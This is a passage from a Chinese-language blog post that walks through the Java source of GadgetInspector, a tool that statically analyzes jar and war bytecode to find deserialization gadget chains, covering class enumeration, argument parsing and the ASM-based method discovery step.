   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="2-ClassResourceEnumerator"><a href="#2-ClassResourceEnumerator" class="headerlink" title="2. ClassResourceEnumerator"></a>2. ClassResourceEnumerator</h2><p>定义类资源接口。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="class"><span class="keyword">interface</span> <span class="title">ClassResource</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> InputStream <span class="title">getInputStream</span><span class="params">()</span> <span class="keyword">throws</span> IOException</span>; <span class="comment">// 读取文件</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span></span>;    <span class="comment">// 文件名</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>类资源具体实现：</p><ul><li><code>PathClassResource</code>：直接从路径读取类文件，用于通过 JRT 文件系统读取路径下的类文件（运行时）</li><li><code>ClassLoaderClassResource</code>：使用已有的 ClassLoader 读取类文件</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 从路径读取类文件</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">PathClassResource</span> <span class="keyword">implements</span> <span class="title">ClassResource</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Path path;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">PathClassResource</span><span class="params">(Path path)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.path = path;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> InputStream <span class="title">getInputStream</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> Files.newInputStream(path);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> path.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用 ClassLoader 读取类文件</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="class"><span class="keyword">class</span> <span class="title">ClassLoaderClassResource</span> <span class="keyword">implements</span> <span class="title">ClassResource</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> ClassLoader classLoader;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String resourceName;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="title">ClassLoaderClassResource</span><span class="params">(ClassLoader classLoader, String resourceName)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.classLoader = classLoader;</span><br><span class="line">        <span class="keyword">this</span>.resourceName = resourceName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> InputStream <span class="title">getInputStream</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> classLoader.getResourceAsStream(resourceName);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> resourceName;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>返回运行时的所有类和指定 java 包中的类，这里的运行时类指 JDK 中的类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 返回 java 运行时的类和指定的 java 包中的类</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Collection&lt;ClassResource&gt; <span class="title">getAllClasses</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="comment">// 先加载运行时类（bootstrap classes）</span></span><br><span class="line">    Collection&lt;ClassResource&gt; result = <span class="keyword">new</span> ArrayList&lt;&gt;(getRuntimeClasses());</span><br><span class="line">    <span class="comment">// 使用 ClassLoader 加载用户指定的 java 包</span></span><br><span class="line">    <span class="keyword">for</span> (ClassPath.ClassInfo classInfo : ClassPath.from(classLoader).getAllClasses()) &#123;</span><br><span class="line">        result.add(<span class="keyword">new</span> ClassLoaderClassResource(classLoader, classInfo.getResourceName()));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 返回运行时的类</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">private</span> Collection&lt;ClassResource&gt; <span class="title">getRuntimeClasses</span><span class="params">()</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">    <span class="comment">// Java8 及以前的运行时类可以通过读取 rt.jar 文件获取</span></span><br><span class="line">    <span class="comment">// A hacky way to get the current JRE&#x27;s rt.jar. Depending on the class loader, rt.jar may be in the</span></span><br><span class="line">    <span class="comment">// bootstrap classloader so all the JDK classes will be excluded from classpath scanning with this!</span></span><br><span class="line">    <span class="comment">// However, this only works up to Java 8, since after that Java uses some crazy module magic.</span></span><br><span class="line">    URL stringClassUrl = Object.class.getResource(<span class="string">&quot;String.class&quot;</span>);</span><br><span class="line">    URLConnection connection = stringClassUrl.openConnection();</span><br><span class="line">    Collection&lt;ClassResource&gt; result = <span class="keyword">new</span> ArrayList&lt;&gt;();</span><br><span class="line">    <span class="keyword">if</span> (connection <span class="keyword">instanceof</span> JarURLConnection) &#123;</span><br><span class="line">        URL runtimeUrl = ((JarURLConnection) connection).getJarFileURL();</span><br><span class="line">        URLClassLoader classLoader = <span class="keyword">new</span> URLClassLoader(<span class="keyword">new</span> URL[]&#123;runtimeUrl&#125;);</span><br><span class="line">        <span class="keyword">for</span> (ClassPath.ClassInfo classInfo : ClassPath.from(classLoader).getAllClasses()) &#123;</span><br><span class="line">            result.add(<span class="keyword">new</span> ClassLoaderClassResource(classLoader, classInfo.getResourceName()));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// Java9 及以后的运行时类通过 JRT 文件系统读取路径下的类文件</span></span><br><span class="line">    <span class="comment">// https://stackoverflow.com/questions/1240387/where-are-the-java-system-packages-stored/53897006#53897006</span></span><br><span class="line">    <span class="comment">// Try finding all the JDK classes using the Java9+ modules method:</span></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        FileSystem fs = FileSystems.getFileSystem(URI.create(<span class="string">&quot;jrt:/&quot;</span>));</span><br><span class="line">        Files.walk(fs.getPath(<span class="string">&quot;/&quot;</span>)).forEach(p -&gt; &#123;</span><br><span class="line">            <span class="keyword">if</span> (p.toString().toLowerCase().endsWith(<span class="string">&quot;.class&quot;</span>)) &#123;</span><br><span class="line">                result.add(<span class="keyword">new</span> PathClassResource(p));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ProviderNotFoundException e) &#123;</span><br><span class="line">        <span class="comment">// Do nothing; this is expected on versions below Java9</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="3-GadgetInspector"><a href="#3-GadgetInspector" class="headerlink" title="3. GadgetInspector"></a>3. GadgetInspector</h2><p>程序入口 <code>main</code>，先做一些准备工作，然后分 5 步走挖掘利用链。</p><p>首先判断参数是否为空，使用 Gadget Inspector 至少要指定一个待分析的 java 包，若参数为空则打印使用帮助。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (args.length == <span class="number">0</span>) &#123;</span><br><span class="line">    printUsage();   <span class="comment">// 打印使用帮助</span></span><br><span class="line">    System.exit(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>配置日志输出、.dat 文件保留、挖掘类型。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 配置 log4j 用于输出日志</span></span><br><span class="line">configureLogging();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 是否保留所有的 .dat 文件</span></span><br><span class="line"><span class="keyword">boolean</span> resume = <span class="keyword">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 挖掘类型，默认为 java 原生序列化</span></span><br><span class="line">GIConfig config = ConfigRepository.getConfig(<span class="string">&quot;jserial&quot;</span>);    <span class="comment">// 实现 SerializableDecider、ImplementationFinder、SourceDiscovery</span></span><br></pre></td></tr></table></figure><p>解析参数，可选参数包括：</p><ul><li><code>--resume</code>：是否保留文件，默认不保留</li><li><code>--config xxx</code>：指定挖掘类型，默认 Java 原生序列化 <code>jserial</code></li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> argIndex = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (argIndex &lt; args.length) &#123;</span><br><span class="line">    String arg = args[argIndex];</span><br><span class="line">    <span class="keyword">if</span> (!arg.startsWith(<span class="string">&quot;--&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (arg.equals(<span class="string">&quot;--resume&quot;</span>)) &#123;</span><br><span class="line">        <span class="comment">// 保留 .dat 文件</span></span><br><span class="line">        resume = <span class="keyword">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (arg.equals(<span class="string">&quot;--config&quot;</span>)) &#123;</span><br><span class="line">        <span class="comment">// 指定挖掘类型</span></span><br><span class="line">        config = ConfigRepository.getConfig(args[++argIndex]);</span><br><span class="line">        <span class="keyword">if</span> (config == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;Invalid config name: &quot;</span> + args[argIndex]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;Unexpected argument: &quot;</span> + arg);</span><br><span class="line">    &#125;</span><br><span class="line">    argIndex += <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据参数读取 war 包或 jar 包，可以指定 1 个 war 包或多个 jar 包。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 实际上是 URLClassLoader</span></span><br><span class="line"><span class="keyword">final</span> ClassLoader classLoader;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 对指定文件根据 war、spring-boot jar、普通 jar 包的方式载入对于字节码文件，并返回 URLClassLoader</span></span><br><span class="line"><span class="keyword">if</span> (args.length == argIndex + <span class="number">1</span> &amp;&amp; args[argIndex].toLowerCase().endsWith(<span class="string">&quot;.war&quot;</span>)) &#123;</span><br><span class="line">    <span class="comment">// 构造 war 文件路径</span></span><br><span class="line">    Path path = Paths.get(args[argIndex]);</span><br><span class="line">    LOGGER.info(<span class="string">&quot;Using WAR classpath: &quot;</span> + path);</span><br><span class="line">    <span class="comment">// 实现为 URLClassLoader，加载 war 包下的 WEB-INF/lib 和 WEB-INF/classes</span></span><br><span class="line">    classLoader = Util.getWarClassLoader(path);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">// 构造 jar 文件路径，可配置多个</span></span><br><span class="line">    <span class="keyword">final</span> Path[] jarPaths = <span class="keyword">new</span> Path[args.length - argIndex];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; args.length - argIndex; i++) &#123;</span><br><span class="line">        Path path = Paths.get(args[argIndex + i]).toAbsolutePath();</span><br><span class="line">        <span class="keyword">if</span> (!Files.exists(path)) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">&quot;Invalid jar path: &quot;</span> + path);</span><br><span class="line">        &#125;</span><br><span class="line">        jarPaths[i] = path;</span><br><span class="line">    &#125;</span><br><span class="line">    LOGGER.info(<span class="string">&quot;Using classpath: &quot;</span> + Arrays.toString(jarPaths));</span><br><span class="line">    <span class="comment">// 实现为 URLClassLoader，加载所有指定的 jar</span></span><br><span class="line">    classLoader = Util.getJarClassLoader(jarPaths);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用上面得到的 ClassLoader 初始化类枚举加载器。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">final</span> ClassResourceEnumerator classResourceEnumerator = <span class="keyword">new</span> ClassResourceEnumerator(classLoader);</span><br></pre></td></tr></table></figure><p>根据 <code>resume</code> 变量的值决定是否删除 .dat 文件，挖掘到的利用链存储在 gadget-chains.txt 中。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!resume) &#123;</span><br><span class="line">    <span class="comment">// Delete all existing dat files</span></span><br><span class="line">    LOGGER.info(<span class="string">&quot;Deleting stale data...&quot;</span>);</span><br><span class="line">    <span class="comment">// 挖掘到的利用链存储在 gadget-chains.txt 中，不删除</span></span><br><span class="line">    <span class="keyword">for</span> (String datFile : Arrays.asList(<span class="string">&quot;classes.dat&quot;</span>, <span class="string">&quot;methods.dat&quot;</span>, <span class="string">&quot;inheritanceMap.dat&quot;</span>,</span><br><span class="line">            <span class="string">&quot;passthrough.dat&quot;</span>, <span class="string">&quot;callgraph.dat&quot;</span>, <span class="string">&quot;sources.dat&quot;</span>, <span class="string">&quot;methodimpl.dat&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">final</span> Path path = Paths.get(datFile);</span><br><span class="line">        <span class="keyword">if</span> (Files.exists(path)) &#123;</span><br><span class="line">            Files.delete(path);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>挖掘过程中判断是否存在 .dat 文件，核心步骤如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Perform the various discovery steps</span></span><br><span class="line"><span class="keyword">if</span> (!Files.exists(Paths.get(<span class="string">&quot;classes.dat&quot;</span>)) || !Files.exists(Paths.get(<span class="string">&quot;methods.dat&quot;</span>))</span><br><span class="line">        || !Files.exists(Paths.get(<span class="string">&quot;inheritanceMap.dat&quot;</span>))) &#123;</span><br><span class="line">    LOGGER.info(<span class="string">&quot;Running method discovery...&quot;</span>);</span><br><span class="line">    MethodDiscovery methodDiscovery = <span class="keyword">new</span> MethodDiscovery();</span><br><span class="line">    methodDiscovery.discover(classResourceEnumerator);</span><br><span class="line">    methodDiscovery.save(); <span class="comment">// 保存类信息、方法信息、继承信息</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!Files.exists(Paths.get(<span class="string">&quot;passthrough.dat&quot;</span>))) &#123;</span><br><span class="line">    LOGGER.info(<span class="string">&quot;Analyzing methods for passthrough dataflow...&quot;</span>);</span><br><span class="line">    PassthroughDiscovery passthroughDiscovery = <span class="keyword">new</span> PassthroughDiscovery();</span><br><span class="line">    passthroughDiscovery.discover(classResourceEnumerator, config);</span><br><span class="line">    passthroughDiscovery.save();    <span class="comment">// 保存数据流信息（方法参数和返回值的关系信息）</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!Files.exists(Paths.get(<span class="string">&quot;callgraph.dat&quot;</span>))) &#123;</span><br><span class="line">    LOGGER.info(<span class="string">&quot;Analyzing methods in order to build a call graph...&quot;</span>);</span><br><span class="line">    CallGraphDiscovery callGraphDiscovery = <span class="keyword">new</span> CallGraphDiscovery();</span><br><span class="line">    callGraphDiscovery.discover(classResourceEnumerator, config);</span><br><span class="line">    callGraphDiscovery.save();  <span class="comment">// 保存调用关系信息（调用者方法与被调方法之间的参数传递）</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!Files.exists(Paths.get(<span class="string">&quot;sources.dat&quot;</span>))) &#123;</span><br><span class="line">    LOGGER.info(<span class="string">&quot;Discovering gadget chain source methods...&quot;</span>);</span><br><span class="line">    SourceDiscovery sourceDiscovery = config.getSourceDiscovery();</span><br><span class="line">    sourceDiscovery.discover();</span><br><span class="line">    sourceDiscovery.save(); <span class="comment">// 保存污点源信息</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    LOGGER.info(<span class="string">&quot;Searching call graph for gadget chains...&quot;</span>);</span><br><span class="line">    GadgetChainDiscovery gadgetChainDiscovery = <span class="keyword">new</span> GadgetChainDiscovery(config);</span><br><span class="line">    gadgetChainDiscovery.discover();    <span class="comment">// 保存重写信息、利用链信息</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>核心步骤看起来有多简单实际实现就有多复杂（<del>不是</del>），下面就展开核心步骤的内容。</p><h2 id="4-MethodDiscovery"><a href="#4-MethodDiscovery" class="headerlink" title="4. MethodDiscovery"></a>4. MethodDiscovery</h2><p><code>discover</code> 方法主要完成的是读取类文件并利用 asm 的访问者记录类信息、方法信息。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 使用访问者记录类信息和方法信息</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> classResourceEnumerator 类枚举器</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> Exception</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">discover</span><span class="params">(<span class="keyword">final</span> ClassResourceEnumerator classResourceEnumerator)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// 遍历所有的类</span></span><br><span class="line">    <span class="keyword">for</span> (ClassResourceEnumerator.ClassResource classResource : classResourceEnumerator.getAllClasses()) &#123;</span><br><span class="line">        <span class="keyword">try</span> (InputStream in = classResource.getInputStream()) &#123; <span class="comment">// 读取类文件</span></span><br><span class="line">            ClassReader cr = <span class="keyword">new</span> ClassReader(in);   <span class="comment">// 创建 ClassReader，后续调用 accept 方法解析类文件</span></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// 继承 asm 的 ClassVisitor(MethodVisitor) 实现对类文件的观察，记录类信息和方法信息</span></span><br><span class="line">                <span class="comment">// 重写方法的调用顺序（没有重写的调用默认方法）：visit -&gt; visitField -&gt; visitMethod -&gt; visitEnd</span></span><br><span class="line">                cr.accept(<span class="keyword">new</span> MethodDiscoveryClassVisitor(), ClassReader.EXPAND_FRAMES);    <span class="comment">// 以扩展格式访问堆栈映射帧</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                LOGGER.error(<span class="string">&quot;Exception analyzing: &quot;</span> + classResource.getName(), e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>MethodDiscoveryClassVisitor</code> 类继承了 asm 中的 ClassVisitor，重写了四个访问者方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> String name;            <span class="comment">// 类的内部名称</span></span><br><span class="line"><span class="keyword">private</span> String superName;       <span class="comment">// 父类的内部名称</span></span><br><span class="line"><span class="keyword">private</span> String[] interfaces;    <span class="comment">// 类接口的内部名称</span></span><br><span class="line"><span class="keyword">boolean</span> isInterface;            <span class="comment">// 是否为接口</span></span><br><span class="line"><span class="keyword">private</span> List&lt;ClassReference.Member&gt; members;    <span class="comment">// 类的所有字段</span></span><br><span class="line"><span class="keyword">private</span> ClassReference.Handle classHandle;      <span class="comment">// 引用</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="title">MethodDiscoveryClassVisitor</span><span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>(Opcodes.ASM6);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>visit</code> 方法在类访问的开始时调用（即 <code>ClassReader.accept</code> 调用的第一个访问者方法），记录类名、父类名、接口名、是否为接口，创建动态数组用于在 <code>visitField</code> 中记录字段信息。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">visit</span><span class="params">(<span class="keyword">int</span> version, <span class="keyword">int</span> access, String name, String signature, String superName, String[] interfaces)</span> </span>&#123;  <span class="comment">// 类访问开始（调用的第一个方法）</span></span><br><span class="line">    <span class="comment">// 记录类信息</span></span><br><span class="line">    <span class="keyword">this</span>.name = name;</span><br><span class="line">    <span class="keyword">this</span>.superName = superName;</span><br><span class="line">    <span class="keyword">this</span>.interfaces = interfaces;</span><br><span class="line">    <span class="keyword">this</span>.isInterface = (access &amp; Opcodes.ACC_INTERFACE) != <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">this</span>.members = <span class="keyword">new</span> ArrayList&lt;&gt;();   <span class="comment">// 字段信息（成员）</span></span><br><span class="line">    <span class="keyword">this</span>.classHandle = <span class="keyword">new</span> ClassReference.Handle(name); <span class="comment">// 当前类</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 调用父类方法</span></span><br><span class="line">    <span class="keyword">super</span>.visit(version, access, name, signature, superName, interfaces);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>visitField</code> 方法用于记录类的字段信息，包括名称、访问标志、类型，根据访问标志 <code>access</code> 判断是否为静态变量，因为静态变量不可控所以不当作可能的污点。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> FieldVisitor <span class="title">visitField</span><span class="params">(<span class="keyword">int</span> access, String name, String desc,    // 访问字段</span></span></span><br><span class="line"><span class="function"><span class="params">                               String signature, Object value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ((access &amp; Opcodes.ACC_STATIC) == <span class="number">0</span>) &#123; <span class="comment">// 跳过静态成员</span></span><br><span class="line">        Type type = Type.getType(desc); <span class="comment">// 类型</span></span><br><span class="line">        String typeName;</span><br><span class="line">        <span class="keyword">if</span> (type.getSort() == Type.OBJECT || type.getSort() == Type.ARRAY) &#123;    <span class="comment">// 对象或数组</span></span><br><span class="line">            typeName = type.getInternalName();  <span class="comment">// 内部名称</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            typeName = type.getDescriptor();    <span class="comment">// 描述符</span></span><br><span class="line">        &#125;</span><br><span 